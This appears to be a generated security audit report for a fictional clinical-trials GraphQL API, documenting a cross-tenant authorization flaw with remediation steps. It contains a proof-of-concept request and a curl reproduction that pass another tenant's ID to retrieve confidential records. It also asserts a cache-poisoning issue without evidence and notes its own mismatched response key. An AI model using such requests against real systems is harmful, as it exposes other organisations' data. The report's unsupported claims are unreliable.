# Security Analysis Report
**System:** TrialVault ClinicalOps API
**Domain:** Pharmaceutical / Clinical Trials
**Example ID:** GQL-0321
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.3 | Semantic ambiguity via over-broad `listResources` endpoint — attacker exploits ambiguous resolver semantics to retrieve cross-tenant clinical trial data |

---

## Finding 1 — Insecure Design: Semantic Ambiguity / Over-Broad Endpoint (Pattern 3.3)

### Summary
The `listResources` resolver on TrialVault ClinicalOps API (`api.trialvault-clinicalo.example.com`) is over-broad — it accepts a client-supplied `tenantId` parameter that was designed for filtering but creates semantic ambiguity: the resolver does not validate whether the supplied `tenantId` matches the JWT's `tenantId`. Per §5.0 Pattern 3.3, this design ambiguity allows an attacker to exploit the over-broad endpoint semantics to retrieve clinical trial records belonging to `tenant-caf9` using a `tenant-4e51` token.

**Context.txt inconsistency (documented):** HAR query uses `listResources(tenantId: "tenant-caf9")`, but the response key in §6.0 is `getResource`. These conflict. The HAR (§6.0) is the primary evidence — this analysis follows the operation observed in the HAR (`listResources`). The response key inconsistency is noted as an artifact of the context.txt.

**Redis cache vulnerability:** Cache is keyed by `resourceId` only (no user/tenant dimension), enabling cross-tenant cache poisoning of clinical trial data.

**Pattern:** 3.3 — Semantic ambiguity (over-broad endpoints) (Insecure Design)
**Affected resolver:** `listResources`
**Affected endpoint:** `POST https://api.trialvault-clinicalo.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.trialvault-clinicalo.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json
x-tenant-id: tenant-4e51

{"query": "query VulnerableOp { listResources(tenantId: \"tenant-caf9\") { resourceId ownerId data { sensitiveField } } }"}
```
Note: `x-request-id` is a **server-assigned response header**, not a request header.

**Response — Victim Clinical Trial Data Returned (cross-tenant)**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-caf9",
      "ownerId": "other-user-4e51caf9",
      "data": {
        "sensitiveField": "CONFIDENTIAL-4e51caf9",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
Attacker token: `tenant-4e51`. Returned data belongs to: `tenant-caf9`. Cross-tenant clinical trial data exposure confirmed.

**Context.txt inconsistency:** HAR sends `listResources` query; response body uses key `getResource`. HAR operation is authoritative.

### Steps to Reproduce
```bash
curl -s -X POST "https://api.trialvault-clinicalo.example.com/graphql" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-4e51" \
  -d '{"query": "query VulnerableOp { listResources(tenantId: \"tenant-caf9\") { resourceId ownerId data { sensitiveField } } }"}'
# Vulnerable: data contains tenant-caf9 clinical trial records — cross-tenant access succeeded
# Secure: {"errors": [{"message": "Forbidden — tenant mismatch"}]}
```

### Remediation
1. In `listResources` resolver: derive `tenantId` exclusively from JWT claims. Reject client-supplied `tenantId`.
2. Remove or clearly document the `tenantId` filter argument as server-derived only to eliminate semantic ambiguity.
3. Re-key Redis cache to include `tenantId`.
